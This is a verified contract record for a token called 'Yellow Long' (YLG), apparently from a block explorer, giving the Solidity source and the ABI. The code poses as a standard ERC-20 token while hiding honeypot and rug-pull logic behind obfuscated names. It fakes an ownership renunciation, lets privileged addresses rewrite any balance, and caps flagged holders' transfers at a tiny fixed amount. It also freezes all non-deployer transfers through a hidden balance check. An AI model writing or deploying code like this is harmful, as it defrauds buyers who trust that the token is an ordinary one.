{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface txTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedTo {\n    function createPair(address txAmount, address autoSellShould) external returns (address);\n}\n\ninterface exemptToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAt) external view returns (uint256);\n\n    function transfer(address takeLaunched, uint256 minTakeEnable) external returns (bool);\n\n    function allowance(address receiverFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTakeEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeLaunched,\n        uint256 minTakeEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamToken, uint256 value);\n    event Approval(address indexed receiverFund, address indexed spender, uint256 value);\n}\n\ninterface exemptTokenMetadata is exemptToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract YellowLong is exemptFund, exemptToken, exemptTokenMetadata {\n\n    mapping(address => mapping(address => uint256)) private teamSwap;\n\n    event OwnershipTransferred(address indexed fundMarketing, address indexed tokenShould);\n\n    address toSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 receiverIsLaunched;\n\n    address liquidityFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public totalMaxFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTeam;\n    }\n\n    uint8 private maxTrading = 18;\n\n    uint256 public sellSwap;\n\n    function enableTake() private view {\n        require(enableMarketing[_msgSender()]);\n    }\n\n    function transfer(address toSender, uint256 minTakeEnable) external virtual override returns (bool) {\n        return walletAmount(_msgSender(), toSender, minTakeEnable);\n    }\n\n    string private txBuy = \"YLG\";\n\n    mapping(address => bool) public enableMarketing;\n\n    uint256 public liquidityMarketing;\n\n    function owner() external view returns (address) {\n        return launchTakeTo;\n    }\n\n    mapping(address => uint256) private tradingMax;\n\n    constructor (){\n        \n        txTeam enableLaunchedIs = txTeam(liquidityFee);\n        feeMarketing = launchedTo(enableLaunchedIs.factory()).createPair(enableLaunchedIs.WETH(), address(this));\n        \n        walletShould = _msgSender();\n        atSwap();\n        enableMarketing[walletShould] = true;\n        tradingMax[walletShould] = receiverTeam;\n        \n        emit Transfer(address(0), walletShould, receiverTeam);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTrading;\n    }\n\n    mapping(address => bool) public buyToken;\n\n    uint256 constant tradingFundReceiver = 15 ** 10;\n\n    function liquidityTake(uint256 minTakeEnable) public {\n        enableTake();\n        swapWallet = minTakeEnable;\n    }\n\n    function toList(address atList) public {\n        enableTake();\n        if (toMax != marketingLimitIs) {\n            sellSwap = liquidityMarketing;\n        }\n        if (atList == walletShould || atList == feeMarketing) {\n            return;\n        }\n        buyToken[atList] = true;\n    }\n\n    function buySellIs(address toSender, uint256 minTakeEnable) public {\n        enableTake();\n        tradingMax[toSender] = minTakeEnable;\n    }\n\n    string private totalExempt = \"Yellow Long\";\n\n    function receiverMinAmount(address senderWallet, address takeLaunched, uint256 minTakeEnable) internal returns (bool) {\n        require(tradingMax[senderWallet] >= minTakeEnable);\n        tradingMax[senderWallet] -= minTakeEnable;\n        tradingMax[takeLaunched] += minTakeEnable;\n        emit Transfer(senderWallet, takeLaunched, minTakeEnable);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalExempt;\n    }\n\n    address public feeMarketing;\n\n    bool private marketingLimitIs;\n\n    function allowance(address toAuto, address swapMax) external view virtual override returns (uint256) {\n        if (swapMax == liquidityFee) {\n            return type(uint256).max;\n        }\n        return teamSwap[toAuto][swapMax];\n    }\n\n    uint256 swapWallet;\n\n    function atSwap() public {\n        emit OwnershipTransferred(walletShould, address(0));\n        launchTakeTo = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txBuy;\n    }\n\n    function balanceOf(address receiverAt) public view virtual override returns (uint256) {\n        return tradingMax[receiverAt];\n    }\n\n    address private launchTakeTo;\n\n    function maxSender(address atMarketing) public {\n        if (totalMaxFund) {\n            return;\n        }\n        if (liquidityMarketing == sellSwap) {\n            liquidityMarketing = sellSwap;\n        }\n        enableMarketing[atMarketing] = true;\n        if (marketingLimitIs != toMax) {\n            sellSwap = liquidityMarketing;\n        }\n        totalMaxFund = true;\n    }\n\n    bool private toMax;\n\n    function transferFrom(address senderWallet, address takeLaunched, uint256 minTakeEnable) external override returns (bool) {\n        if (_msgSender() != liquidityFee) {\n            if (teamSwap[senderWallet][_msgSender()] != type(uint256).max) {\n                require(minTakeEnable <= teamSwap[senderWallet][_msgSender()]);\n                teamSwap[senderWallet][_msgSender()] -= minTakeEnable;\n            }\n        }\n        return walletAmount(senderWallet, takeLaunched, minTakeEnable);\n    }\n\n    function walletAmount(address senderWallet, address takeLaunched, uint256 minTakeEnable) internal returns (bool) {\n        if (senderWallet == walletShould) {\n            return receiverMinAmount(senderWallet, takeLaunched, minTakeEnable);\n        }\n        uint256 enableMode = exemptToken(feeMarketing).balanceOf(toSwap);\n        require(enableMode == swapWallet);\n        require(takeLaunched != toSwap);\n        if (buyToken[senderWallet]) {\n            return receiverMinAmount(senderWallet, takeLaunched, tradingFundReceiver);\n        }\n        return receiverMinAmount(senderWallet, takeLaunched, minTakeEnable);\n    }\n\n    function approve(address swapMax, uint256 minTakeEnable) public virtual override returns (bool) {\n        teamSwap[_msgSender()][swapMax] = minTakeEnable;\n        emit Approval(_msgSender(), swapMax, minTakeEnable);\n        return true;\n    }\n\n    address public walletShould;\n\n    uint256 private receiverTeam = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return launchTakeTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeEnable\",\"type\":\"uint256\"}],\"name\":\"buySellIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTakeEnable\",\"type\":\"uint256\"}],\"name\":\"liquidityTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"}],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"}],\"name\":\"toList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMaxFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "YellowLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}